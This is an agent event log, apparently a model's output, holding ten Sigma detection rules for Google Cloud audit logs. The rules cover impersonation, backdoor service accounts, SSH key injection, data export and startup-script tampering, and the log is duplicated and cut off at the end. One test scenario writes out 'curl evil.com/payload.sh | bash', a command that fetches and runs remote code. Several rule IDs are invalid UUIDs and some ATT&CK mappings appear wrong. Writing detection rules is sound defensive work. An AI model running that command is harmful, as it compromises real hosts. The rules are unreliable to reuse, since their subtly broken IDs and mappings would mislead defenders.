\"protoPayload.requestMetadata.callerSuppliedUserAgent\": \"Python-urllib/3.9\"\n        }\n      }\n    }\n  ],\n  \"total_rules\": 10,\n  \"ttp_coverage\": [\n    \"T1550.001\",\n    \"T1136.003\",\n    \"T1098.004\",\n    \"T1537\",\n    \"T1490\",\n    \"T1053.007\",\n    \"T1562.007\",\n    \"T1021.007\",\n    \"T1648\",\n    \"T1087.004\"\n  ],\n  \"generation_notes\": \"Refined 10 rules for Google Cloud Platform. Generated unique rule IDs. Improved detection logic for several rules (e.g., Service Account Creation) by using multiple, more precise filter blocks. Corrected a logic error in the BigQuery extraction rule. Enhanced descriptions and false positive notes for better operational use. The rules now better distinguish between high-fidelity alerts and informational/or informational events for threat hunting.\"\n}\"\"\"\n    ),\n  ],\n  role='model'\n), grounding_metadata=None, partial=None, turn_complete=None, finish_reason=<FinishReason.STOP: 'STOP'>, error_code=None, error_message=None, interrupted=None, custom_metadata=None, usage_metadata=GenerateContentResponseUsageMetadata(\n  candidates_token_count=8499,\n  candidates_tokens_details=[\n    ModalityTokenCount(\n      modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=8499\n    ),\n  ],\n  prompt_token_count=42015,\n  prompt_tokens_details=[\n    ModalityTokenCount(\n      modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=42015\n    ),\n  ],\n  thoughts_token_count=2192,\n  total_token_count=52706,\n  traffic_type=<TrafficType.ON_DEMAND: 'ON_DEMAND'>\n), live_session_resumption_update=None, input_transcription=None, output_transcription=None, avg_logprobs=-0.09019200012731277, logprobs_result=None, cache_metadata=None, citation_metadata=None, interaction_id=None, invocation_id='e-660895d3-7355-4328-b397-705b1d1a241e', author='sigma_generator', actions=EventActions(skip_summarization=None, state_delta={}, artifact_delta={}, transfer_to_agent=None, escalate=None, requested_auth_configs={}, requested_tool_confirmations={}, compaction=None, end_of_agent=None, agent_state=None, rewind_before_invocation_id=None), long_running_tool_ids=None, branch=None, id='690ed244-ef41-4460-84d8-441b5f86bfd1', timestamp=1770508160.433626)]",
  "formatted_rules": "[Event(model_version='gemini-2.5-flash', content=Content(\n  parts=[\n    Part(\n      text=\"\"\"{\n    \"rules\": [\n        {\n            \"title\": \"GCP User Impersonating Service Account\",\n            \"id\": \"e4a7b8f1-3c5d-4b9c-8a1e-1f2g3h4i5j6k\",\n            \"status\": \"experimental\",\n            \"description\": \"Detects when a non-service account principal (i.e., a user) generates an OAuth2 access token for a service account. This is a primary privilege escalation vector in GCP, allowing an attacker with the 'iam.serviceAccountTokenCreator' role to impersonate a service account and gain all its permissions, potentially bypassing MFA.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1550/001/\",\n                \"https://cloud.google.com/iam/docs/impersonating-service-accounts\",\n                \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.privilege_escalation\",\n                \"attack.t1550.001\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName\": \"google.iam.credentials.v1.GenerateAccessToken\"\n                },\n                \"filter_legitimate\": {\n                    \"protoPayload.authenticationInfo.principalEmail|endswith\": \".gserviceaccount.com\"\n                },\n                \"condition\": \"selection and not filter_legitimate\"\n            },\n            \"falsepositives\": [\n                \"Legitimate administrative scripts or tools that run under a user's identity to generate tokens for service accounts, although this is uncommon and should be audited.\",\n                \"Break-glass or emergency access procedures performed by administrators.\"\n            ],\n            \"level\": \"high\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"protoPayload.request.name\",\n                \"resource.labels.project_id\",\n                \"protoPayload.requestMetadata.callerIp\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"A compromised user account 'attacker@example.com' executes 'gcloud iam service-accounts generate-access-token privileged-sa@...', resulting in a 'google.iam.credentials.v1.GenerateAccessToken' log where 'principalEmail' is 'attacker@example.com'.\",\n                \"false_negative\": \"An attacker uses a compromised service account to generate a token for another service account. This is a valid SA-to-SA impersonation scenario not covered by this rule.\",\n                \"false_positive\": \"An on-call SRE 'admin@example.com' uses a documented playbook to manually generate a token for a service account to debug a production issue.\",\n                \"true_negative\": \"A Cloud Build service account ('1234@cloudbuild.gserviceaccount.com') generates a token for a deployment service account as part of a standard CI/CD pipeline.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"google.iam.credentials.v1.GenerateAccessToken\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@external-domain.com\",\n                    \"protoPayload.request.name\": \"projects/-/serviceAccounts/admin-sa@victim-project.iam.gserviceaccount.com\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP Service Account Created by Unexpected Principal\",\n            \"id\": \"a9b8c7d6-e5f6-4890-1234-567890abcdef\",\n            \"status\": \"experimental\",\n            \"description\": \"Detects the creation of a new IAM Service Account by an unexpected principal or tool. Adversaries may create new service accounts to establish a persistent backdoor. This rule filters for known automated principals and IaC tools.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1136/003/\",\n                \"https://cloud.google.com/iam/docs/creating-managing-service-accounts\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.persistence\",\n                \"attack.t1136.003\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName\": \"google.iam.admin.v1.CreateServiceAccount\"\n                },\n                \"filter_legitimate\": {\n                    \"principal\": {\n                        \"protoPayload.authenticationInfo.principalEmail|endswith\": [\n                            \".gserviceaccount.com\"\n                        ]\n                    },\n                    \"tool\": {\n                        \"protoPayload.requestMetadata.callerSuppliedUserAgent|contains\": [\n                            \"Terraform\",\n                            \"Pulumi\",\n                            \"Deployment Manager\",\n                            \"GCP-Console-Enduser\"\n                        ]\n                    }\n                },\n                \"condition\": \"selection and not (principal or tool)\"\n            },\n            \"falsepositives\": [\n                \"Legitimate manual creation of service accounts by developers or administrators using a non-standard tool or `gcloud`.\",\n                \"A new, unlisted IaC or automation tool being used to create service accounts.\"\n            ],\n            \"level\": \"medium\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"protoPayload.request.accountId\",\n                \"resource.labels.project_id\",\n                \"protoPayload.requestMetadata.callerIp\",\n                \"protoPayload.requestMetadata.callerSuppliedUserAgent\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker, having compromised a developer's account, uses a custom script to create a new service account named 'gcp-backup-svc' to use as a backdoor.\",\n                \"false_negative\": \"An attacker uses Terraform to create a service account, which would be filtered by the 'tool' filter.\",\n                \"false_positive\": \"A developer uses `gcloud iam service-accounts create` to legitimately create a service account for a new application.\",\n                \"true_negative\": \"A Cloud Build service account creates another service account as part of a pipeline, which is filtered by the 'principal' filter.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"google.iam.admin.v1.CreateServiceAccount\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"compromised-user@example.com\",\n                    \"protoPayload.request.accountId\": \"backdoor-sa\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP SSH Keys Added To Project or Instance Metadata\",\n            \"id\": \"b2c3d4e5-f6g7-49i0-j1k2-l3m4n5o6p7q8\",\n            \"status\": \"stable\",\n            \"description\": \"Detects when SSH keys are added to project-wide or instance-specific metadata. Adversaries may inject their own public SSH keys to establish persistent, passwordless access to Compute Engine instances.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1098/004/\",\n                \"https://cloud.google.com/compute/docs/connect/add-ssh-keys\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.persistence\",\n                \"attack.t1098.004\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName|endswith\": [\n                        \"compute.projects.setCommonInstanceMetadata\",\n                        \"compute.instances.setMetadata\"\n                    ],\n                    \"protoPayload.request.metadata.items.key\": \"ssh-keys\"\n                },\n                \"filter_legitimate\": {\n                    \"protoPayload.authenticationInfo.principalEmail\": \"oslogin-admin@system.gserviceaccount.com\"\n                },\n                \"condition\": \"selection and not filter_legitimate\"\n            },\n            \"falsepositives\": [\n                \"Administrators legitimately adding or updating SSH keys for new users.\",\n                \"Use of `gcloud compute ssh` which can automatically add the user's key to project metadata, often triggered by a user's first connection.\",\n                \"Automated systems or IaC tools (Terraform, Ansible) that manage SSH key distribution.\"\n            ],\n            \"level\": \"high\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"resource.labels.project_id\",\n                \"protoPayload.requestMetadata.callerIp\",\n                \"protoPayload.request.metadata.items.value\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker with project editor rights calls 'compute.projects.setCommonInstanceMetadata' to add their public SSH key to the 'ssh-keys' metadata item.\",\n                \"false_negative\": \"An attacker with shell access adds their SSH key directly to the '~/.ssh/authorized_keys' file on a compromised VM instance without using the metadata service. This requires OS-level logging to detect.\",\n                \"false_positive\": \"A new developer runs `gcloud compute ssh` for the first time, and gcloud automatically adds their public key to the project metadata.\",\n                \"true_negative\": \"An administrator updates the 'startup-script' metadata key for an instance.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"v1.compute.projects.setCommonInstanceMetadata\",\n                    \"protoPayload.request.metadata.items.key\": \"ssh-keys\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP BigQuery Data Extraction Job\",\n            \"id\": \"c4d5e6f7-g8h9-41j2-k3l4-m5n6o7p8q9r0\",\n            \"status\": \"experimental\",\n            \"description\": \"Detects the creation of a BigQuery job to export data to a Cloud Storage bucket. Adversaries may use this technique to exfiltrate large datasets. This rule is a baseline and should be tuned by adding known legitimate principals or destination bucket names to the filter.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1537/\",\n                \"https://cloud.google.com/bigquery/docs/exporting-data\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.exfiltration\",\n                \"attack.t1537\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName\": \"google.cloud.bigquery.v2.JobService.InsertJob\",\n                    \"protoPayload.serviceData.jobInsertion.job.configuration.extract.destinationUris|contains\": \"gs://\"\n                },\n                \"filter_legitimate\": {\n                    \"protoPayload.authenticationInfo.principalEmail|endswith\": \"@gcp-sa-bigquery-datastransfer.iam.gserviceaccount.com\"\n                },\n                \"condition\": \"selection and not filter_legitimate\"\n            },\n            \"falsepositives\": [\n                \"Legitimate ETL processes that export data to Cloud Storage for processing, backup, or archival.\",\n                \"Data sharing with partners via approved Cloud Storage buckets.\",\n                \"This rule is prone to false positives and should be tuned by filtering for known-good destination buckets or principal accounts.\"\n            ],\n            \"level\": \"medium\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"protoPayload.serviceData.jobInsertion.job.configuration.extract.sourceTable.projectId\",\n                \"protoPayload.serviceData.jobInsertion.job.configuration.extract.sourceTable.tableId\",\n                \"protoPayload.serviceData.jobInsertion.job.configuration.extract.destinationUris\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker uses compromised credentials to run a BigQuery export job, sending a sensitive table to an external Cloud Storage bucket 'gs://attacker-bucket'.\",\n                \"false_negative\": \"An attacker exfiltrates data row-by-row using the 'tabledata.list' API, which is not a bulk export job.\",\n                \"false_positive\": \"A nightly automated job run by 'prod-etl@my-project.iam.gserviceaccount.com' exports analytics data to a 'gs://my-project-archive' bucket.\",\n                \"true_negative\": \"A data analyst runs a SELECT query within the BigQuery console that does not export any data.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"google.cloud.bigquery.v2.JobService.InsertJob\",\n                    \"protoPayload.serviceData.jobInsertion.job.configuration.extract.destinationUris\": \"gs://attacker-controlled-bucket/export.csv\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"compromised-user@example.com\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP Compute Snapshot Deleted\",\n            \"id\": \"d6e7f8g9-h0i1-43k4-l5m6-n7o8p9q0r1s2\",\n            \"status\": \"stable\",\n            \"description\": \"Detects the deletion of a Compute Engine disk snapshot. Adversaries may delete snapshots to inhibit system recovery, often as a precursor to a ransomware attack or other destructive event.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1490/\",\n                \"https://cloud.google.com/compute/docs/disks/create-snapshots\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.impact\",\n                \"attack.t1490\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName|endswith\": \"compute.snapshots.delete\"\n                },\n                \"filter_legitimate\": {\n                    \"protoPayload.authenticationInfo.principalEmail|re\": \".+@gcp-sa-gce-snapshot\\\\.iam\\\\.gserviceaccount\\\\.com\"\n                },\n                \"condition\": \"selection and not filter_legitimate\"\n            },\n            \"falsepositives\": [\n                \"Automated scripts or infrastructure-as-code (e.g., Terraform) deleting snapshots as part of resource cleanup.\",\n                \"Administrators manually deleting old or unnecessary snapshots to save costs.\",\n                \"Snapshot lifecycle policies deleting snapshots that have passed their retention period.\"\n            ],\n            \"level\": \"medium\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"resource.labels.project_id\",\n                \"protoPayload.resourceName\",\n                \"protoPayload.requestMetadata.callerIp\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker with editor rights deletes all available disk snapshots to prevent recovery before deploying ransomware.\",\n                \"false_negative\": \"An attacker modifies a snapshot retention policy to retain zero snapshots. The modification of the policy would be the event to detect, not the subsequent deletions by the system.\",\n                \"false_positive\": \"A snapshot lifecycle policy, executed by '1234@gcp-sa-gce-snapshot.iam.gserviceaccount.com', deletes a snapshot that is older than its configured retention period.\",\n                \"true_negative\": \"A new snapshot is created as part of a daily backup schedule.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"v1.compute.snapshots.delete\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\",\n                    \"protoPayload.resourceName\": \"projects/victim-project/global/snapshots/snapshot-to-delete\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP VM Startup Script Modified\",\n            \"id\": \"e8f9g0h1-i2j3-45l6-m7n8-o9p0q1r2s3t4\",\n            \"status\": \"experimental\",\n            \"description\": \"Detects modification of a Compute Engine instance's startup script metadata. Adversaries use this technique for persistence, as the script executes with root/System privileges each time the VM starts.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1053/007/\",\n                \"https://cloud.google.com/compute/docs/instances/startup-scripts\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.persistence\",\n                \"attack.execution\",\n                \"attack.t1053.007\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName|endswith\": \"compute.instances.setMetadata\",\n                    \"protoPayload.request.metadata.items.key\": [\n                        \"startup-script\",\n                        \"startup-script-url\",\n                        \"windows-startup-script-ps1\",\n                        \"windows-startup-script-url\",\n                        \"windows-startup-script-bat\",\n                        \"windows-startup-script-cmd\"\n                    ]\n                },\n                \"filter_legitimate\": {\n                    \"protoPayload.requestMetadata.callerSuppliedUserAgent|contains\": [\n                        \"Terraform\",\n                        \"Ansible\",\n                        \"Pulumi\",\n                        \"Deployment Manager\",\n                        \"gcloud\"\n                    ]\n                },\n                \"condition\": \"selection and not filter_legitimate\"\n            },\n            \"falsepositives\": [\n                \"Administrators legitimately updating startup scripts for configuration changes using gcloud or other tools.\",\n                \"Configuration management tools (e.g., Ansible) or IaC tools (e.g., Terraform) modifying instance metadata as part of a planned deployment.\"\n            ],\n            \"level\": \"high\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"protoPayload.resourceName\",\n                \"resource.labels.project_id\",\n                \"protoPayload.request.metadata.items.key\",\n                \"protoPayload.request.metadata.items.value\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker uses a custom script to modify the 'startup-script' metadata of a critical VM to include 'curl evil.com/payload.sh | bash'.\",\n                \"false_negative\": \"An attacker with shell access modifies a systemd service or cron job to achieve persistence, bypassing the instance metadata service.\",\n                \"false_positive\": \"A DevOps engineer uses Terraform to apply an updated startup script to a fleet of VMs.\",\n                \"true_negative\": \"An administrator adds a non-startup-related metadata tag, such as 'owner: team-x', to an instance.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"v1.compute.instances.setMetadata\",\n                    \"protoPayload.request.metadata.items.key\": \"startup-script\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP Permissive Inbound Firewall Rule Created\",\n            \"id\": \"f0g1h2i3-j4k5-47m8-n9o0-p1q2r3s4t5u6\",\n            \"status\": \"stable\",\n            \"description\": \"Detects the creation or modification of a GCP Firewall Rule to allow inbound traffic from any source on the internet (0.0.0.0/0). Adversaries create such rules to open ports for C2, remote access, or to expose internal services.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1562/007/\",\n                \"https://cloud.google.com/vpc/docs/firewalls\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.defense_evasion\",\n                \"attack.t1562.007\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName|endswith\": [\n                        \"compute.firewalls.insert\",\n                        \"compute.firewalls.patch\"\n                    ],\n                    \"protoPayload.request.sourceRanges\": \"0.0.0.0/0\"\n                },\n                \"filter_legitimate\": {\n                    \"protoPayload.request.allowed.ports\": [\n                        \"80\",\n                        \"443\"\n                    ]\n                },\n                \"condition\": \"selection and not filter_legitimate\"\n            },\n            \"falsepositives\": [\n                \"Legitimate creation of firewall rules for public-facing web servers or load balancers on ports 80/443.\",\n                \"Setting up network appliances or services that require broad port access temporarily for configuration.\"\n            ],\n            \"level\": \"high\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"resource.labels.project_id\",\n                \"protoPayload.resourceName\",\n                \"protoPayload.request.allowed.IPProtocol\",\n                \"protoPayload.request.allowed.ports\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker creates a firewall rule named 'allow-rdp' that allows TCP traffic on port 3389 from source '0.0.0.0/0'.\",\n                \"false_negative\": \"An attacker modifies a firewall rule to allow traffic only from a specific IP range they control ('5.6.7.8/32') instead of the global '0.0.0.0/0'.\",\n                \"false_positive\": \"A web administrator creates a firewall rule to allow traffic on ports 80 and 443 from '0.0.0.0/0' for a new public website.\",\n                \"true_negative\": \"A network administrator creates a firewall rule to allow SSH traffic (port 22) between two internal VPC subnets.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"v1.compute.firewalls.insert\",\n                    \"protoPayload.request.sourceRanges\": \"0.0.0.0/0\",\n                    \"protoPayload.request.allowed.ports\": \"3389\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP IAM Policy Changed via User Impersonation\",\n            \"id\": \"2c8d7b9e-6a4c-4e8d-8a6c-9c3f5d7b1a0e\",\n            \"status\": \"experimental\",\n            \"description\": \"Detects when an IAM policy is modified by a human user that is actively impersonating a service account. This indicates that an escalated privilege obtained through impersonation is being used for lateral movement or persistence by altering permissions.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1021/007/\",\n                \"https://cloud.google.com/iam/docs/impersonating-service-accounts\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.lateral_movement\",\n                \"attack.persistence\",\n                \"attack.t1021.007\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName|endswith\": \"SetIamPolicy\",\n                    \"protoPayload.authenticationInfo.serviceAccountDelegationInfo\": \"*\",\n                    \"protoPayload.authenticationInfo.principalEmail|contains\": \"@\"\n                },\n                \"filter_legitimate\": {\n                    \"protoPayload.authenticationInfo.principalEmail|endswith\": \".gserviceaccount.com\"\n                },\n                \"condition\": \"selection and not filter_legitimate\"\n            },\n            \"falsepositives\": [\n                \"Legitimate administrative actions performed by users who are correctly configured to use service account impersonation for managing IAM policies.\",\n                \"Automated CI/CD pipelines that use user-impersonation to deploy infrastructure and set permissions.\"\n            ],\n            \"level\": \"critical\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"protoPayload.authenticationInfo.serviceAccountDelegationInfo.firstPartyPrincipal.principalEmail\",\n                \"protoPayload.resourceName\",\n                \"protoPayload.requestMetadata.callerIp\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker ('attacker@evil.com'), having impersonated 'privileged-sa@...', uses those credentials to call 'SetIamPolicy' to make their own account a project owner.\",\n                \"false_negative\": \"An attacker uses an access key for a compromised service account directly, without impersonation. The 'serviceAccountDelegationInfo' field would be absent.\",\n                \"false_positive\": \"A lead cloud engineer, following best practices, impersonates a deployment service account to manually apply a hotfix to an IAM policy.\",\n                \"true_negative\": \"A service account, acting on its own, modifies an IAM policy without any impersonation involved.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"google.iam.v1.IAMPolicy.SetIamPolicy\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@evil.com\",\n                    \"protoPayload.authenticationInfo.serviceAccountDelegationInfo\": \"{...}\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP Compute Engine Instance Launched\",\n            \"id\": \"3b4c5d6e-7f8g-4a0b-1c2d-3e4f5a6b7c8d\",\n            \"status\": \"experimental\",\n            \"description\": \"Detects the launch of a new GCP Compute Engine virtual machine instance. Adversaries may launch new instances in a compromised environment for C2, data staging, or to expand their operational infrastructure. This rule is informational and intended for hunting.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1648/\",\n                \"https://cloud.google.com/compute/docs/instances/create-start-instance\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.resource_development\",\n                \"attack.t1648\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName|endswith\": \"compute.instances.insert\"\n                },\n                \"filter_legitimate\": {\n                    \"principal\": {\n                        \"protoPayload.authenticationInfo.principalEmail|re\": \".*@gce-spot-agent\\\\.iam\\\\.gserviceaccount\\\\.com|.*@cloudbuild\\\\.gserviceaccount\\\\.com\"\n                    },\n                    \"tool\": {\n                        \"protoPayload.requestMetadata.callerSuppliedUserAgent|contains\": \"Terraform\"\n                    }\n                },\n                \"condition\": \"selection and not (principal or tool)\"\n            },\n            \"falsepositives\": [\n                \"Legitimate creation of VMs by developers for testing.\",\n                \"Auto-scaling groups launching new instances in response to increased load.\",\n                \"CI/CD pipelines creating ephemeral VMs for build and test jobs.\",\n                \"Deployment of new applications via infrastructure-as-code.\"\n            ],\n            \"level\": \"informational\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"protoPayload.resourceName\",\n                \"resource.labels.project_id\",\n                \"protoPayload.request.machineType\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker with compromised credentials uses a custom script to create a new VM named 'c2-server' to host their infrastructure.\",\n                \"false_negative\": \"An attacker compromises an existing, dormant VM and repurposes it, which does not involve an 'insert' operation.\",\n                \"false_positive\": \"A Google Compute Engine autoscaler group creates a new VM to handle a spike in web traffic.\",\n                \"true_negative\": \"An administrator stops and then starts an existing VM.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"v1.compute.instances.insert\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\",\n                    \"protoPayload.resourceName\": \"projects/victim-project/zones/us-central1-a/instances/c2-server\"\n                }\n            }\n        },\n        {\n            \"title\": \"GCP IAM Discovery Activity\",\n            \"id\": \"4a5b6c7d-8e9f-4b1c-2d3e-4f5a6b7c8d9e\",\n            \"status\": \"experimental\",\n            \"description\": \"Detects enumeration of IAM policies and service accounts. After gaining access, adversaries perform reconnaissance to map permissions and plan escalation. This rule is highly informational and should be used for threat hunting, not direct alerting, unless correlated and thresholded in a SIEM.\",\n            \"references\": [\n                \"https://attack.mitre.org/techniques/T1087/004/\",\n                \"https://cloud.google.com/iam/docs/reference/rest\"\n            ],\n            \"author\": \"Automated Detection Agent\",\n            \"date\": \"2024-07-29\",\n            \"modified\": \"2024-07-31\",\n            \"tags\": [\n                \"attack.discovery\",\n                \"attack.t1087.004\"\n            ],\n            \"logsource\": {\n                \"product\": \"gcp\",\n                \"service\": \"gcp.audit\"\n            },\n            \"detection\": {\n                \"selection\": {\n                    \"protoPayload.methodName\": [\n                        \"google.iam.v1.IAMPolicy.GetIamPolicy\",\n                        \"google.iam.v1.IAMPolicy.TestIamPermissions\",\n                        \"google.iam.admin.v1.ListServiceAccounts\",\n                        \"google.cloud.resourcemanager.v3.Projects.GetIamPolicy\"\n                    ]\n                },\n                \"condition\": \"selection\"\n            },\n            \"falsepositives\": [\n                \"Any legitimate use of the GCP Console, `gcloud`, or IaC tools which make numerous 'Get' and 'List' calls.\",\n                \"This rule is extremely noisy and requires a SIEM to apply anomaly detection or thresholding (e.g., >N calls from a single user in Y minutes) to become actionable.\"\n            ],\n            \"level\": \"informational\",\n            \"fields\": [\n                \"protoPayload.authenticationInfo.principalEmail\",\n                \"protoPayload.requestMetadata.callerIp\",\n                \"protoPayload.requestMetadata.callerSuppliedUserAgent\",\n                \"protoPayload.resourceName\"\n            ],\n            \"test_scenarios\": {\n                \"true_positive\": \"An attacker uses a script to iterate through all projects, calling 'GetIamPolicy' and 'TestIamPermissions' on each one.\",\n                \"false_negative\": \"An attacker who already knows their target does not need to perform broad discovery, thus may not trigger any threshold-based alerts built on this rule.\",\n                \"false_positive\": \"A developer opens the IAM page in the GCP console, triggering dozens of 'GetIamPolicy' calls.\",\n                \"true_negative\": \"A user creates a new Cloud Storage bucket.\",\n                \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n                \"example_log_fields\": {\n                    \"protoPayload.methodName\": \"google.iam.v1.IAMPolicy.GetIamPolicy\",\n                    \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\",\n                    \"protoPayload.requestMetadata.callerSuppliedUserAgent\": \"Python-urllib/3.9\"\n                }\n            }\n        }\n    ],\n    \"total_rules\": 10,\n    \"ttp_coverage\": [\n        \"T1550.001\",\n        \"T1136.003\",\n        \"T1098.004\",\n        \"T1537\",\n        \"T1490\",\n        \"T1053.007\",\n        \"T1562.007\",\n        \"T1021.007\",\n        \"T1648\",\n        \"T1087.004\"\n    ],\n    \"generation_notes\": \"Refined 10 rules for Google Cloud Platform. Generated unique rule IDs. Improved detection logic for several rules (e.g., Service Account Creation) by using multiple, more precise filter blocks. Corrected a logic error in the BigQuery extraction rule. Enhanced descriptions and false positive notes for better operational use. The rules now better distinguish between high-fidelity alerts and informational/or informational events for threat hunting.\"\n}\"\"\"\n    ),\n  ],\n  role='model'\n), grounding_metadata=None, partial=None, turn_complete=None, finish_reason=<FinishReason.STOP: 'STOP'>, error_code=None, error_message=None, interrupted=None, custom_metadata=None, usage_metadata=GenerateContentResponseUsageMetadata(\n  candidates_token_count=8499,\n  candidates_tokens_details=[\n    ModalityTokenCount(\n  